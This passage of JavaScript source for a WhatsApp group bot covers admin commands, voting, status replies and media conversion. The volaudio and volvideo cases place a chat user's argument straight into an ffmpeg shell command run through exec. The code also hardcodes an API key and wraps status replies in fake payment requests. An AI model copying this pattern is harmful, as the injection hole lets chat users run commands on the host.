      .filter(item => item.id !== botNumber && item.id !== `${ownernumber}@s.whatsapp.net`)
      .map(item => item.id);
 for (let promote of aespisppromoteall) {
 await ArielStore.groupParticipantsUpdate(m.chat, [(args[0] === "numBut") ? `${promote}@s.whatsapp.net` : promote], "promote");
 await sleep(100);
 }
 replygcaespisp(`Success`);
}
break
case 'demoteall': {
 if (!m.isGroup) return aespispStickGroup()
 if (!isAdmins && !isGroupOwner && !aespispTheCreator) return aespispStickAdmin()
 if (!isBotAdmins) return aespispStickBotAdmin()
  const aespispdemoteall = (args[0] === 'numBut')
  ? text.replace(`${args[0]} `, '').split('|')
  : (Number(args[0]))
    ? groupMetadata.participants
      .filter(item => item.id.startsWith(args[0].replace('+', '')) && item.id !== botNumber && item.id !== `${ownernumber}@s.whatsapp.net`)
      .map(item => item.id)
    : groupMetadata.participants
      .filter(item => item.id !== botNumber && item.id !== `${ownernumber}@s.whatsapp.net`)
      .map(item => item.id);
 for (let demote of aespispdemoteall) {
 await ArielStore.groupParticipantsUpdate(m.chat, [(args[0] === "numBut") ? `${demote}@s.whatsapp.net` : demote], "demote");
 await sleep(100);
 }
 replygcaespisp(`Success`);
}
break
            case 'hidetag':
                if (!m.isGroup) return aespispStickGroup()
                if (!isAdmins && !isGroupOwner && !aespispTheCreator) return aespispStickAdmin()
                if (!isBotAdmins) return aespispStickBotAdmin()
                ArielStore.sendMessage(m.chat, {
                    text: q ? q : '',
                    mentions: participants.map(a => a.id)
                }, {
                    quoted: m
                })
            break
            case 'totag':
                if (!m.isGroup) return aespispStickGroup()
                if (!isBotAdmins) return aespispStickBotAdmin()
                if (!isAdmins) return replygcaespisp(mess.admin)
                if (!m.quoted) return replygcaespisp(`Reply media with caption ${prefix + command}`)
                ArielStore.sendMessage(m.chat, {
                    forward: m.quoted.fakeObj,
                    mentions: participants.map(a => a.id)
                })
            break
            case 'group':
            case 'grup':{
                if (!m.isGroup) return aespispStickGroup()
                if (!isAdmins && !isGroupOwner && !aespispTheCreator) return aespispStickAdmin()
                if (!isBotAdmins) return aespispStickBotAdmin()
                if (args[0] === 'close') {
                    await ArielStore.groupSettingUpdate(m.chat, 'announcement').then((res) => replygcaespisp(`Success Closing Group`))
                } else if (args[0] === 'open') {
                    await ArielStore.groupSettingUpdate(m.chat, 'not_announcement').then((res) => replygcaespisp(`Success Opening Group`))
                } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./ArielFolder/theme/aespixyz.jpg')}, { upload: ArielStore.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: ftroli })

await ArielStore.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
                }
            break
            case 'editinfo':{
                if (!m.isGroup) return aespispStickGroup()
                if (!isAdmins && !isGroupOwner && !aespispTheCreator) return aespispStickAdmin()
                if (!isBotAdmins) return aespispStickBotAdmin()
                if (args[0] === 'open') {
                    await ArielStore.groupSettingUpdate(m.chat, 'unlocked').then((res) => replygcaespisp(`Successfully Opened Edit Group Info`))
                } else if (args[0] === 'close') {
                    await ArielStore.groupSettingUpdate(m.chat, 'locked').then((res) => replygcaespisp(`Successfully Closed Edit Group Info`))
                } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./ArielFolder/theme/aespixyz.jpg')}, { upload: ArielStore.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363282476141407@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: ftroli })

await ArielStore.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
}
            break
            case 'linkgroup':
            case 'linkgrup':
            case 'linkgc':
            case 'gclink':
            case 'grouplink':
            case 'gruplink':
                if (!m.isGroup) return aespispStickGroup()
                if (!isAdmins && !isGroupOwner && !aespispTheCreator) return aespispStickAdmin()
                if (!isBotAdmins) return aespispStickBotAdmin()
                let response = await ArielStore.groupInviteCode(m.chat)
                ArielStore.sendText(m.chat, `👥 *GROUP LINK*\n📛 *Name :* ${groupMetadata.subject}\n👤 *Owner Grup :* ${groupMetadata.owner !== undefined ? '+'+ groupMetadata.owner.split`@`[0] : 'Not known'}\n🌱 *ID :* ${groupMetadata.id}\n🔗 *Chat Link :* https://chat.whatsapp.com/${response}\n👥 *Member :* ${groupMetadata.participants.length}\n`, m, {
                    detectLink: true
                })
            break
            case 'getbio':{
              try {
    let who
    if (m.isGroup) who = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted.sender
    else who = m.quoted.sender ? m.quoted.sender : m.sender
    let bio = await ArielStore.fetchStatus(who)
    replygcaespisp(bio.status)
  } catch {
    if (text) return replygcaespisp(`bio is private or you haven't replied to the person's message!`)
    else try {
      let who = m.quoted ? m.quoted.sender : m.sender
      let bio = await ArielStore.fetchStatus(who)
      replygcaespisp(bio.status)
    } catch {
      return replygcaespisp(`bio is private or you haven't replied to the person's message!`)
    }
  }
}
break
        break
        case 'vote': {
            if (!m.isGroup) return aespispStickGroup()
            if (m.chat in vote) return replygcaespisp(`_There are still votes in this chat!_\n\n*${prefix}deletevote* - to delete votes`)
            if (!text) return replygcaespisp(`Enter Reason for Vote, Example: *${prefix + command} Handsome Owner*`)
            replygcaespisp(`Voting starts!\n\n*${prefix}upvote* - for upvote\n*${prefix}downvote* - for downvote\n*${prefix}checkvote* - to check the vote\n*${prefix}deletevote* - to delete vote`)
            vote[m.chat] = [q, [], []]
            await sleep(1000)
            upvote = vote[m.chat][1]
            devote = vote[m.chat][2]
            teks_vote = `* VOTE *

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
│
│ 
└────

┌〔 DOWNVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
│
│ 
└────

Please Type Below
*${prefix}upvote* - to cast vote
*${prefix}downvote* -  to downvote
*${prefix}deletevote* - to delete vote`
            ArielStore.sendMessage(m.chat, {text: teks_vote}, {quoted:m})
	    }
            break
               case 'upvote': {
            if (!m.isGroup) return aespispStickGroup()
            if (!(m.chat in vote)) return replygcaespisp(`_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`)
            isVote = vote[m.chat][1].concat(vote[m.chat][2])
            wasVote = isVote.includes(m.sender)
            if (wasVote) return replygcaespisp('You have Voted')
            vote[m.chat][1].push(m.sender)
            menvote = vote[m.chat][1].concat(vote[m.chat][2])
            teks_vote = `* VOTE *

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DOWNVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

Please Type Below
*${prefix}upvote* - to upvote
*${prefix}downvote* -  to downvote
*${prefix}deletevote* - to delete vote`
            ArielStore.sendMessage(m.chat, {text: teks_vote, mentions: menvote}, {quoted:m})
	    }
             break
                case 'downvote': {
            if (!m.isGroup) return aespispStickGroup()
            if (!(m.chat in vote)) return replygcaespisp(`_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`)
            isVote = vote[m.chat][1].concat(vote[m.chat][2])
            wasVote = isVote.includes(m.sender)
            if (wasVote) return replygcaespisp('You have Voted')
            vote[m.chat][2].push(m.sender)
            menvote = vote[m.chat][1].concat(vote[m.chat][2])
            teks_vote = `* VOTE *

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DOWNVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

Please Type Below
*${prefix}upvote* - to upvote
*${prefix}downvote* -  to downvote
*${prefix}deletevote* - to delete vote`
            ArielStore.sendMessage(m.chat, {text: teks_vote, mentions: menvote}, {quoted:m})
	}
            break
                 
case 'checkvote':
if (!m.isGroup) return aespispStickGroup()
if (!(m.chat in vote)) return replygcaespisp(`_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`)
teks_vote = `* VOTE *

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${upvote.length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DOWNVOTE 〕
│ 
├ Total: ${devote.length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

*${prefix}deletevote* - to delete votes


©${ArielStore.user.id}
`
ArielStore.sendTextWithMentions(m.chat, teks_vote, m)
break
		case 'deletevote': case'delvote': case 'hapusvote': {
            if (!m.isGroup) return aespispStickGroup()
            if (!(m.chat in vote)) return replygcaespisp(`_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`)
            delete vote[m.chat]
            replygcaespisp('Successfully Deleted Vote Session In This Group')
	    }
            break
break
            case 'revoke':
            case 'resetlink':
                if (!m.isGroup) return aespispStickGroup()
                if (!isAdmins && !isGroupOwner && !aespispTheCreator) return aespispStickAdmin()
                if (!isBotAdmins) return aespispStickBotAdmin()
                await ArielStore.groupRevokeInvite(m.chat)
                    .then(res => {
                        replygcaespisp(`Reset Success`)
                    })
            break
                //bot status
            case 'ping': case 'botstatus': case 'statusbot': case 'p': {
	const used = process.memoryUsage()
                const cpus = os.cpus().map(cpu => {
                    cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
			        return cpu
                })
                const cpu = cpus.reduce((last, cpu, _, { length }) => {
                    last.total += cpu.total
                    last.speed += cpu.speed / length
                    last.times.user += cpu.times.user
                    last.times.nice += cpu.times.nice
                    last.times.sys += cpu.times.sys
                    last.times.idle += cpu.times.idle
                    last.times.irq += cpu.times.irq
                    return last
                }, {
                    speed: 0,
                    total: 0,
                    times: {
			            user: 0,
			            nice: 0,
			            sys: 0,
			            idle: 0,
			            irq: 0
                }
                })
                let timestamp = speed()
                let latensi = speed() - timestamp
                neww = performance.now()
                oldd = performance.now()
                respon = `
Response Speed ${latensi.toFixed(4)} _Second_ \n ${oldd - neww} _miliseconds_\n\nRuntime : ${runtime(process.uptime())}

💻 Info Server
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}

_NodeJS Memory Usaage_
${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}

${cpus[0] ? `_Total CPU Usage_
${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}
_CPU Core(s) Usage (${cpus.length} Core CPU)_
${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}
                `.trim()
	ArielStore.relayMessage(m.chat,  {
        requestPaymentMessage: {
          currencyCodeIso4217: 'INR',
          amount1000: 999999999,
          requestFrom: m.sender,
          noteMessage: {
          extendedTextMessage: {
          text: respon,
          contextInfo: {
          externalAdReply: {
          showAdAttribution: true
          }}}}}}, { quoted: ftroli })
    }
	
	break
	case 'repo': case 'repository': {
  try {
    const [, username, repoName] = botscript.match(/github\.com\/([^/]+)\/([^/]+)/)
    const response = await axios.get(`https://api.github.com/repos/${username}/${repoName}`)
    if (response.status === 200) {
      const repoData = response.data
      const formattedInfo = `
${themeemoji} Repository Name: ${repoData.name}
${themeemoji} Description: ${repoData.description}
${themeemoji} Owner: ${repoData.owner.login}
${themeemoji} Stars: ${repoData.stargazers_count}
${themeemoji} Forks: ${repoData.forks_count}
${themeemoji} URL: ${repoData.html_url}
     
 `.trim()
      await ArielStore.relayMessage(m.chat,  {
        requestPaymentMessage: {
          currencyCodeIso4217: 'INR',
          amount1000: 69000,
          requestFrom: m.sender,
          noteMessage: {
          extendedTextMessage: {
          text: formattedInfo,
          contextInfo: {
          externalAdReply: {
          showAdAttribution: true
          }}}}}}, { quoted: ftroli })
    } else {
      await replygcaespisp(`Unable to fetch repository information`)
    }
  } catch (error) {
    console.error(error)
    await replygcaespisp(`Repository currently not available `)
  }
}
break
            case 'buypremium':
            case 'premiumuser': {
                let teks = `Hi ${pushname}👋\nWant to Buy Premium?Just chat with the owner😉`
                await ArielStore.sendMessage(m.chat, {
                    text: teks,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: botname,
                            body: ownername,
                            thumbnailUrl: 'https://i.ibb.co/Wppj16p/aespixyz.jpg',
                            sourceUrl: wagc,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: m
                })
            }
            break
            case 'rentbot':
                replygcaespisp(`Type ${prefix}owner and chat him`)
                break
            case 'speedtest': {
                replygcaespisp('Testing Speed...')
                let cp = require('child_process')
                let {
                    promisify
                } = require('util')
                let exec = promisify(cp.exec).bind(cp)
                let o
                try {
                    o = await exec('python speed.py')
                } catch (e) {
                    o = e
                } finally {
                    let {
                        stdout,
                        stderr
                    } = o
                    if (stdout.trim()) ArielStore.sendMessage(m.chat, {
                        text: stdout,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnailUrl: 'https://i.ibb.co/Wppj16p/aespixyz.jpg',
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                    if (stderr.trim()) ArielStore.sendMessage(m.chat, {
                        text: stderr,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnailUrl: 'https://i.ibb.co/Wppj16p/aespixyz.jpg',
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }
            }
            break
            case 'runtime':
                let pinga = `Bots Have Been Running For ${runtime(process.uptime())}`
                ArielStore.sendMessage(m.chat, {
                    text: pinga,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: botname,
                            body: ownername,
                            thumbnailUrl: 'https://i.ibb.co/Wppj16p/aespixyz.jpg',
                            sourceUrl: wagc,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: m
                })
                break
case 'sc': case 'script': case 'donate': case 'donate': case 'cekupdate': case 'updatebot': case 'cekbot': case 'sourcecode': {
let me = m.sender
let teks = `*「  ${global.botname} Script 」*\n\nYouTube: ${global.websitex}\nGitHub: ${global.botscript}\n\nHi @${me.split('@')[0]} 👋\nDont forget to donate yeah🍜 👇 https://i.ibb.co/y6XmZ2b/donate.png`
sendaespispBotIncMessage(from, { 
text: teks,
mentions:[sender],
contextInfo:{
forwardingScore: 9999999,
isForwarded: true, 
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": fs.readFileSync("./ArielFolder/theme/aespixyz.jpg"),
"mediaUrl": `${wagc}`,
"sourceUrl": `${wagc}`
}
}
})
}
break
                case 'owner': {
                ArielStore.sendContact(from, global.nomorariel, ftroli)
            }
            break
            //convert
case 's': case 'sticker': case 'stiker': case 'setiker': {
if (!quoted) return replygcaespisp(`Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds`)
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await ArielStore.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.ownername })
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return replygcaespisp('Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds')
let media = await quoted.download()
let encmedia = await ArielStore.sendVideoAsSticker(m.chat, media, ftroli, { packname: global.packname, author: global.ownername })
} else {
replygcaespisp(`Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds`)
}
}
break
            case 'swm': case 'steal': case 'stickerwm': case 'take':{
//asia
if (!args.join(" ")) return replygcaespisp(`Where is the text?`)
const swn = args.join(" ")
const pcknm = swn.split("|")[0]
const atnm = swn.split("|")[1]
if (m.quoted.isAnimated === true) {
ArielStore.downloadAndSaveMediaMessage(quoted, "gifee")
ArielStore.sendMessage(m.chat, {sticker:fs.readFileSync("gifee.webp")}, m, { packname: pcknm, author: atnm })
} else if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await ArielStore.sendImageAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return replygcaespisp('Maximum 10 Seconds!')
let media = await quoted.download()
let encmedia = await ArielStore.sendVideoAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
} else {
replygcaespisp(`Photo/Video?`)
}
}
break
            case 'toimage':
            case 'toimg': {
                if (!/webp/.test(mime)) return replygcaespisp(`Reply sticker with caption *${prefix + command}*`)
                await aespispStickWait()
                let media = await ArielStore.downloadAndSaveMediaMessage(qmsg)
                let ran = await getRandom('.png')
                exec(`ffmpeg -i ${media} ${ran}`, (err) => {
                    fs.unlinkSync(media)
                    if (err) return err
                    let buffer = fs.readFileSync(ran)
                    ArielStore.sendMessage(m.chat, {
                        image: buffer
                    }, {
                        quoted: m
                    })
                    fs.unlinkSync(ran)
                })

            }
            break
            case 'tomp4':
            case 'tovideo': {
                if (!/webp/.test(mime)) return replygcaespisp(`Reply sticker with caption *${prefix + command}*`)
                await aespispStickWait()
                let media = await ArielStore.downloadAndSaveMediaMessage(qmsg)
                let webpToMp4 = await webp2mp4File(media)
                await ArielStore.sendMessage(m.chat, {
                    video: {
                        url: webpToMp4.result,
                        caption: 'Convert Webp To Video'
                    }
                }, {
                    quoted: m
                })
                await fs.unlinkSync(media)

            }
            break
            case 'toaud':
            case 'toaudio': {
                if (!/video/.test(mime) && !/audio/.test(mime)) return replygcaespisp(`Send/Reply Video/Audio that you want to make into audio with captions ${prefix + command}`)
                await aespispStickWait()
                let media = await ArielStore.downloadMediaMessage(qmsg)
                let audio = await toAudio(media, 'mp4')
                ArielStore.sendMessage(m.chat, {
                    audio: audio,
                    mimetype: 'audio/mpeg'
                }, {
                    quoted: m
                })

            }
            break
            case 'tomp3': {
                if (!/video/.test(mime) && !/audio/.test(mime)) return replygcaespisp(`Send/Reply Video/Audio that you want to make into MP3 with captions ${prefix + command}`)
                await aespispStickWait()
                let media = await ArielStore.downloadMediaMessage(qmsg)
                let audio = await toAudio(media, 'mp4')
                ArielStore.sendMessage(m.chat, {
                    document: audio,
                    mimetype: 'audio/mp3',
                    fileName: `dgaespisp.mp3`
                }, {
                    quoted: m
                })

            }
            break
            case 'tovn':
            case 'toptt': {
                if (!/video/.test(mime) && !/audio/.test(mime)) return replygcaespisp(`Send/Reply Video/Audio that you want to make into a VN with captions ${prefix + command}`)
                await aespispStickWait()
                let media = await ArielStore.downloadMediaMessage(qmsg)
                let {
                    toPTT
                } = require('./lib/converter')
                let audio = await toPTT(media, 'mp4')
                ArielStore.sendMessage(m.chat, {
                    audio: audio,
                    mimetype: 'audio/mpeg',
                    ptt: true
                }, {
                    quoted: m
                })

            }
            break
            case 'togif': {
                if (!/webp/.test(mime)) return replygcaespisp(`Reply sticker with caption *${prefix + command}*`)
                await aespispStickWait()
                let media = await ArielStore.downloadAndSaveMediaMessage(qmsg)
                let webpToMp4 = await webp2mp4File(media)
                await ArielStore.sendMessage(m.chat, {
                    video: {
                        url: webpToMp4.result,
                        caption: 'Convert Webp To Video'
                    },
                    gifPlayback: true
                }, {
                    quoted: m
                })
                await fs.unlinkSync(media)

            }
            break
            case 'tourl': {
                await aespispStickWait()
                let media = await ArielStore.downloadAndSaveMediaMessage(qmsg)
                if (/image/.test(mime)) {
                    let anu = await TelegraPh(media)
                    replygcaespisp(util.format(anu))
                } else if (!/image/.test(mime)) {
                    let anu = await UploadFileUgu(media)
                    replygcaespisp(util.format(anu))
                }
                await fs.unlinkSync(media)

            }
            break
            case 'emojimix': {
                let [emoji1, emoji2] = text.split`+`
                if (!emoji1) return replygcaespisp(`Example : ${prefix + command} 😅+🤔`)
                if (!emoji2) return replygcaespisp(`Example : ${prefix + command} 😅+🤔`)
                await aespispStickWait()
                let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
                for (let res of anu.results) {
                    let encmedia = await ArielStore.sendImageAsSticker(m.chat, res.url, m, {
                        packname: global.packname,
                        author: global.ownername,
                        categories: res.tags
                    })
                }
            }
            break
            case 'emojimix2': {
                if (!text) return replygcaespisp(`Example : ${prefix + command} 😅`)
                let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(text)}`)
                for (let res of anu.results) {
                    let encmedia = await ArielStore.sendImageAsSticker(m.chat, res.url, m, {
                        packname: global.packname,
                        author: global.ownername,
                        categories: res.tags
                    })
                }
            }
            break
            case 'toonce':
            case 'toviewonce': {
                if (!quoted) return replygcaespisp(`Reply Image/Video`)
                if (/image/.test(mime)) {
                    anuan = await ArielStore.downloadAndSaveMediaMessage(quoted)
                    ArielStore.sendMessage(m.chat, {
                        image: {
                            url: anuan
                        },
                        caption: mess.done,
                        fileLength: "999",
                        viewOnce: true
                    }, {
                        quoted: m
                    })
                } else if (/video/.test(mime)) {
                    anuanuan = await ArielStore.downloadAndSaveMediaMessage(quoted)
                    ArielStore.sendMessage(m.chat, {
                        video: {
                            url: anuanuan
                        },
                        caption: mess.done,
                        fileLength: "99999999",
                        viewOnce: true
                    }, {
                        quoted: m
                    })
                } else if (/audio/.test(mime)) {
                   bebasap = await ArielStore.downloadAndSaveMediaMessage(quoted)
                   ArielStore.sendMessage(m.chat, {
                     audio: {
                        url: bebasap
                     },
                     mimetype: 'audio/mpeg',
                     ptt: true,
                     viewOnce: true
                   })
                }
            }
            break
            case 'fliptext': {
                if (args.length < 1) return replygcaespisp(`Example:\n${prefix}fliptext dgaespisp`)
                quere = args.join(" ")
                flipe = quere.split('').reverse().join('')
                replygcaespisp(`\`\`\`「 FLIP TEXT 」\`\`\`\n*•> Normal :*\n${quere}\n*•> Flip :*\n${flipe}`)
            }
            break
            case 'toqr':{
  if (!q) return replygcaespisp(' Please include link or text!')
   const QrCode = require('qrcode-reader')
   const qrcode = require('qrcode')
   let qyuer = await qrcode.toDataURL(q, { scale: 35 })
   let data = new Buffer.from(qyuer.replace('data:image/png;base64,', ''), 'base64')
   let buff = getRandom('.jpg')
   await fs.writeFileSync('./'+buff, data)
   let medi = fs.readFileSync('./' + buff)
  await ArielStore.sendMessage(from, { image: medi, caption:"Here you go!"}, { quoted: ftroli })
   setTimeout(() => { fs.unlinkSync(buff) }, 10000)
  }
  break
  case 'volaudio': {
if (!args.join(" ")) return replygcaespisp(`Example: ${prefix + command} 10`)
media = await ArielStore.downloadAndSaveMediaMessage(quoted, "volume")
rname = getRandom('.mp3')
exec(`ffmpeg -i ${media} -filter:a volume=${args[0]} ${rname}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return replygcaespisp('Error!')
jadie = fs.readFileSync(rname)
ArielStore.sendMessage(from, {audio:jadie, mimetype: 'audio/mp4', ptt: true}, {quoted: m})
fs.unlinkSync(rname)
})
}
break
case 'volvideo': {
if (!args.join(" ")) return replygcaespisp(`Example: ${prefix + command} 10`)
media = await ArielStore.downloadAndSaveMediaMessage(quoted, "volume")
rname = getRandom('.mp4')
exec(`ffmpeg -i ${media} -filter:a volume=${args[0]} ${rname}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return replygcaespisp('Error!')
jadie = fs.readFileSync(rname)
ArielStore.sendMessage(from, {video:jadie, mimetype: 'video/mp4'}, {quoted: m})
fs.unlinkSync(rname)
})
}
break
  case 'bass': case 'blown': case 'deep': case 'earrape': case 'fast': case 'fat': case 'nightcore': case 'reverse': case 'robot': case 'slow': case 'smooth': case 'squirrel':
                try {
                let set
                if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
                if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
                if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
                if (/earrape/.test(command)) set = '-af volume=12'
                if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
                if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
                if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
                if (/reverse/.test(command)) set = '-filter_complex "areverse"'
                if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
                if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
                if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
                if (/squirrel/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
                if (/audio/.test(mime)) {
                await aespispStickWait()
                let media = await ArielStore.downloadAndSaveMediaMessage(quoted)
                let ran = getRandom('.mp3')
                exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
                fs.unlinkSync(media)
                if (err) return replygcaespisp(err)
                let buff = fs.readFileSync(ran)
                ArielStore.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : ftroli })
                fs.unlinkSync(ran)
                })
                } else replygcaespisp(`Reply to the audio you want to change with a caption *${prefix + command}*`)
                } catch (e) {
                replygcaespisp(e)
                }
                break
                //media db
  case 'listbadword':{
let teks = '┌──⭓「 *VN List* 」\n│\n'
for (let x of bad) {
teks += `│⭔ ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Totally there are : ${bad.length}*`
replygcaespisp(teks)
}
break

            //game
            case 'ttc':
            case 'ttt':
            case 'tictactoe': {
                let TicTacToe = require("./lib/tictactoe")
                this.game = this.game ? this.game : {}
                if (Object.values(this.game).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))) return replygcaespisp('You are still in the game')
                let room = Object.values(this.game).find(room => room.state === 'WAITING' && (text ? room.name === text : true))
                if (room) {
                    replygcaespisp('Partner not found!')
                    room.o = m.chat
                    room.game.playerO = m.sender
                    room.state = 'PLAYING'
